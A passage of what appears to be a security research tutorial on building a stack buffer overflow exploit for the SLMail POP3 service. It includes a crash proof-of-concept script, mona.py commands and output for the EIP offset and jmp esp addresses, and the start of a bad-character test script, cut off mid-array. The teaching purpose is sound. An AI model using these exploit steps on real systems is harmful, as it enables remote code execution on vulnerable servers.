<ul><li>Find the offset on the buffer to the exact four bytes that overwrite the saved EIP on the stack, which lets us control the execution flow.</li><li>Find enough space in memory we can control to store our shellcode.</li><li>Find the bad characters that could affect our exploit.</li><li>Find the value we must put in the saved EIP to make the execution flow jump to our shellcode stored in memory</li></ul>



<p>First, drop the plugin mona.py into the PyCommands folder (inside the Immunity Debugger application folder).</p>



<p>You can check if mona.py is working by typing “!mona” in the command bar of the Immunity Debugger. If everything works, the log window will show the help screen of mona.py.</p>



<p>Next, configure mona.py to store data in a folder other than the default. The default location is the Immunity Debugger application folder, and on Windows 7 installations if you don’t run Immunity as Administrator when mona.py tries to store results, it will fail.</p>



<pre class="wp-block-code"><code>!mona config -set workingfolder c:\logs\%p</code></pre>



<p>The code above sets up mona.py to create a folder inside the folder c:\logs, with the name of the process being debugged.</p>



<p>Once mona.py is configured, it is time to start investigating the vulnerability we are trying to exploit.</p>



<p>First we need to find the offset to the bytes that could control EIP. The fastest method to do this is using a feature included in Metasploit, called Metasploit pattern. Inside the framework tools folder, we find the scripts pattern_create.rb and pattern_offset.rb. The former creates a string pattern where every three-character substring is unique (e.g..: Aa0Aa1Aa2Aa3Aa4). The second script is to calculate the offset once we know which four bytes fits inside the EIP when the program crashes.</p>



<p>To make things easier, mona.py can create a unique cyclic pattern like Metasploit does. To create a cyclic pattern 6000 bytes in length with mona.py, the following command must be typed in the Immunity Debugger command bar.</p>



<pre class="wp-block-code"><code>!mona pc 6000</code></pre>



<p>The command creates the file c:\logs\slmail\pattern.txt with the cyclic pattern inside. The pattern must be copied into the Python code. Here is how the poc2.py file would look:</p>



<pre class="wp-block-code"><code>import sys
import socket

# Cyclic pattern created with !mona pc 6000
buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6AF7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6BF7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6CF7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6DF7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6EF7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6FF7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6GF7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl0Gl1Gl2Gl3Gl4Gl5Gl6Gl7Gl8Gl9Gm0Gm1Gm2Gm3Gm4Gm5Gm6Gm7Gm8Gm9Gn0Gn1Gn2Gn3Gn4Gn5Gn6Gn7Gn8Gn9Go0Go1Go2Go3Go4Go5Go6Go7Go8Go9Gp0Gp1Gp2Gp3Gp4Gp5Gp6Gp7Gp8Gp9Gq0Gq1Gq2Gq3Gq4Gq5Gq6Gq7Gq8Gq9Gr0Gr1Gr2Gr3Gr4Gr5Gr6Gr7Gr8Gr9Gs0Gs1Gs2Gs3Gs4Gs5Gs6Gs7Gs8Gs9Gt0Gt1Gt2Gt3Gt4Gt5Gt6Gt7Gt8Gt9Gu0Gu1Gu2Gu3Gu4Gu5Gu6Gu7Gu8Gu9Gv0Gv1Gv2Gv3Gv4Gv5Gv6Gv7Gv8Gv9Gw0Gw1Gw2Gw3Gw4Gw5Gw6Gw7Gw8Gw9Gx0Gx1Gx2Gx3Gx4Gx5Gx6Gx7Gx8Gx9Gy0Gy1Gy2Gy3Gy4Gy5Gy6Gy7Gy8Gy9Gz0Gz1Gz2Gz3Gz4Gz5Gz6Gz7Gz8Gz9Ha0Ha1Ha2Ha3Ha4Ha5Ha6Ha7Ha8Ha9Hb0Hb1Hb2Hb3Hb4Hb5Hb6Hb7Hb8Hb9Hc0Hc1Hc2Hc3Hc4Hc5Hc6Hc7Hc8Hc9Hd0Hd1Hd2Hd3Hd4Hd5Hd6Hd7Hd8Hd9He0He1He2He3He4He5He6He7He8He9Hf0Hf1Hf2Hf3Hf4Hf5Hf6HF7Hf8Hf9Hg0Hg1Hg2Hg3Hg4Hg5Hg6Hg7Hg8Hg9Hh0Hh1Hh2Hh3Hh4Hh5Hh6Hh7Hh8Hh9Hi0Hi1Hi2Hi3Hi4Hi5Hi6Hi7Hi8Hi9Hj0Hj1Hj2Hj3Hj4Hj5Hj6Hj7Hj8Hj9Hk0Hk1Hk2Hk3Hk4Hk5Hk6Hk7Hk8Hk9Hl0Hl1Hl2Hl3Hl4Hl5Hl6Hl7Hl8Hl9Hm0Hm1Hm2Hm3Hm4Hm5Hm6Hm7Hm8Hm9Hn0Hn1Hn2Hn3Hn4Hn5Hn6Hn7Hn8Hn9Ho0Ho1Ho2Ho3Ho4Ho5Ho6Ho7Ho8Ho9Hp0Hp1Hp2Hp3Hp4Hp5Hp6Hp7Hp8Hp9Hq0Hq1Hq2Hq3Hq4Hq5Hq6Hq7Hq8Hq9Hr0Hr1Hr2Hr3Hr4Hr5Hr6Hr7Hr8Hr9'

HOST = '127.0.0.1'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()
</code></pre>



<p>The next step is to attach the slmail process to the Immunity Debugger and run the poc2.py file. The process crashed and Immunity Debugger shows an access violation. We need to look at the EIP value and take note of its value at the crash moment.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7727" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/2-5/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?fit=886%2C711&amp;ssl=1" data-orig-size="886,711" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?fit=300%2C241&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?fit=886%2C711&amp;ssl=1" loading="lazy" width="886" height="711" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=886%2C711&#038;ssl=1" alt class="wp-image-7727 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?w=886&amp;ssl=1 886w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=300%2C241&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=768%2C616&amp;ssl=1 768w" data-lazy-sizes="(max-width: 886px) 100vw, 886px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=886%2C711&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7727" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/2-5/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?fit=886%2C711&amp;ssl=1" data-orig-size="886,711" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?fit=300%2C241&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?fit=886%2C711&amp;ssl=1" loading="lazy" width="886" height="711" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=886%2C711&#038;ssl=1" alt="" class="wp-image-7727" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?w=886&amp;ssl=1 886w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=300%2C241&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/2.png?resize=768%2C616&amp;ssl=1 768w" sizes="(max-width: 886px) 100vw, 886px" data-recalc-dims="1" /></noscript></figure>



<p>To figure out the offset to the EIP control bytes, mona.py offers two options:</p>



<pre class="wp-block-code"><code>!mona pattern_offset 0x7A46317A (where 0x7A46317A is the value of EIP at the crash time)
!mona findmsp</code></pre>



<p>The first method shows the distance to the four bytes that control EIP, in the log window of Immunity.</p>



<p>The second method will create the file c:\logs\slmail\findmsp.txt. The content of the file should look like:</p>



<pre class="wp-block-code"><code>&#91;+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x016118e8 (length 6000 bytes)
    EIP contains normal pattern : 0x7a46317a (offset 4654)
    ESP (0x01cea154) points at offset 4658 in normal pattern (length 430)
    EBP contains normal pattern : 0x46307a46 (offset 4650)    
&#91;+] Examining SEH chain
&#91;+] Examining stack (entire stack) - looking for cyclic pattern
    Walking stack from 0x01ce8000 to 0x01cefffc (0x00007ffc bytes)
    0x01ce8fe4 : Contains normal cyclic pattern at ESP-0x1170 (-4464) : offset 4092, length 996 (-&gt; 0x01ce93c7 : ESP-0xd8c)
    0x01ce9f20 : Contains normal cyclic pattern at ESP-0x234 (-564) : offset 4094, length 994 (-&gt; 0x01cea301 : ESP+0x1ae)
    0x01ceab14 : Contains normal cyclic pattern at ESP+0x9c0 (+2496) : offset 4092, length 996 (-&gt; 0x01ceaeF7 : ESP+0xda4)
    0x01cecf1c : Contains normal cyclic pattern at ESP+0x2dc8 (+11720) : offset 4092, length 996 (-&gt; 0x01ced2ff : ESP+0x31ac)
&#91;+] Examining stack (entire stack) - looking for pointers to cyclic pattern
    Walking stack from 0x01ce8000 to 0x01cefffc (0x00007ffc bytes)
    0x01ce8f94 : Pointer into normal cyclic pattern at ESP-0x11c0 (-4544) : 0x01cea148 : offset 4646, length 442
    0x01ce9c58 : Pointer into normal cyclic pattern at ESP-0x4fc (-1276) : 0x01ceae00 : offset 4840, length 248
    0x01ce9d20 : Pointer into normal cyclic pattern at ESP-0x434 (-1076) : 0x01cea010 : offset 4334, length 754
    0x01ce9dcc : Pointer into normal cyclic pattern at ESP-0x388 (-904) : 0x01cea08c : offset 4458, length 630
    0x01ce9ddc : Pointer into normal cyclic pattern at ESP-0x378 (-888) : 0x01cea010 : offset 4334, length 754
    0x01ce9de0 : Pointer into normal cyclic pattern at ESP-0x374 (-884) : 0x01cea060 : offset 4414, length 674
    0x01ce9df0 : Pointer into normal cyclic pattern at ESP-0x364 (-868) : 0x01cea00c : offset 4330, length 758
    0x01cef378 : Pointer into normal cyclic pattern at ESP+0x5224 (+21028) : 0x01cecf1c : offset 4092, length 996
    0x01cef4d8 : Pointer into normal cyclic pattern at ESP+0x5384 (+21380) : 0x01ced07c : offset 4444, length 644
    0x01cef588 : Pointer into normal cyclic pattern at ESP+0x5434 (+21556) : 0x01cea158 : offset 4662, length 426
    0x01cef5d4 : Pointer into normal cyclic pattern at ESP+0x5480 (+21632) : 0x0160f0c4 : offset 4091, length 1909
    0x01ceF704 : Pointer into normal cyclic pattern at ESP+0x55b0 (+21936) : 0x01cea2d4 : offset 5042, length 46
    0x01ceF75c : Pointer into normal cyclic pattern at ESP+0x5608 (+22024) : 0x0160f0c4 : offset 4091, length 1909
</code></pre>



<p>As can be seen, this method offers lots of information. First of all, we can see that EIP contains bytes of the normal pattern at the offset 4654.We can see that ESP points to the cyclic pattern at the offset 4658 just behind the four bytes that control EIP, and mona.py also informs us that we have 430 bytes length to store data.</p>



<p>As a plus, mona.py offers information about several memory locations that contain the cyclic pattern, and several memory pointers that point directly to the cyclic pattern. We now have the information needed to write an exploit.</p>



<p>We can put the shellcode just behind the four bytes that control EIP (at offset 4658) because we know that the register ESP is pointing directly to this address. So to change the flow control of the process and control the execution, we just need to put the memory address of an instruction that makes a jump to the address ESP points to inyo EIP. So we need to find an instruction like jmp esp, call esp, or push esp; ret.</p>



<p>To find these instructions in memory, we are going to use mona.py again. In the Immunity Debugger command bar, after attaching it to the slmail process, we execute:</p>



<pre class="wp-block-code"><code>!mona jmp -r ESP</code></pre>



<p>This command tells mona.py to search for an instruction to jump to ESP inside the process binary and the DLLs loaded in memory on execution time (by default it looks in all DLLs loaded in memory; we can use the -m switch to make it search in DLLs passed as parameters). The result is stored in the file c:\logs\slmail\jmp.txt. Here is part of the file created:</p>



<pre class="wp-block-code"><code>0x7608bce1 : jmp esp |  {PAGE_EXECUTE_READ} &#91;MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.02.3104.0 (C:\WINDOWS\system32\MSVCP60.dll)
0x7c91fcd8 : jmp esp |  {PAGE_EXECUTE_READ} &#91;ntdll.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6055 (C:\WINDOWS\system32\ntdll.dll)
0x71a91c8b : jmp esp |  {PAGE_EXECUTE_READ} &#91;wshtcpip.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\System32\wshtcpip.dll)
0x77559c77 : jmp esp |  {PAGE_EXECUTE_READ} &#91;ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
0x7755a9a8 : jmp esp |  {PAGE_EXECUTE_READ} &#91;ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
0x775a693b : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} &#91;ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
0x775aa873 : jmp esp |  {PAGE_EXECUTE_READ} &#91;ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
0x775c0af3 : jmp esp |  {PAGE_EXECUTE_READ} &#91;ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
0x77fab257 : jmp esp |  {PAGE_EXECUTE_READ} &#91;SHLWAPI.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5912 (C:\WINDOWS\system32\SHLWAPI.dll)
0x662eb24f : jmp esp |  {PAGE_EXECUTE_READ} &#91;hnetcfg.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\hnetcfg.dll)
0x7e429353 : jmp esp |  {PAGE_EXECUTE_READ} &#91;USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
0x7e4456F7 : jmp esp |  {PAGE_EXECUTE_READ} &#91;USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
0x7e455aF7 : jmp esp |  {PAGE_EXECUTE_READ} &#91;USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} &#91;USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
</code></pre>



<p>Any of these memory addresses containing a jmp esp instructions is good to put in EIP and make the flow jump to our shellcode.</p>



<p>We need consider and address any bad characters (bad char), because if the address chosen contains a bad char the exploit will fail.</p>



<p>So we need to figure out what bad chars affect our exploit. For this task, mona.py comes in handy again.</p>



<p>The task of finding bad chars is very simple once the process is understood:</p>



<ul><li>You need to create a byte array with all possible bytes (from 0x00 to 0xff) and put them all in the buffer injected in the exploit</li><li>Run the process attached to the debugger</li><li>Execute the exploit</li><li>After the crash, compare the byte array in memory with the original byte array. If a byte has changed, it is a bad char</li><li>Repeat the last step taking any bad char detected out from the array, until the byte array fits in memory equal to the byte array generated</li></ul>



<p>To create the byte array:</p>



<pre class="wp-block-code"><code>!mona bytearray</code></pre>



<p>This will generate two files in c:\logs\slmail: bytearray.txt, with the array in text format to use on the exploit, and bytearray.bin, with the exact representation of this byte array in memory.</p>



<p>Here is the exploit with the byte array:</p>



<pre class="wp-block-code"><code>import sys
import socket

bytearray=(\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f
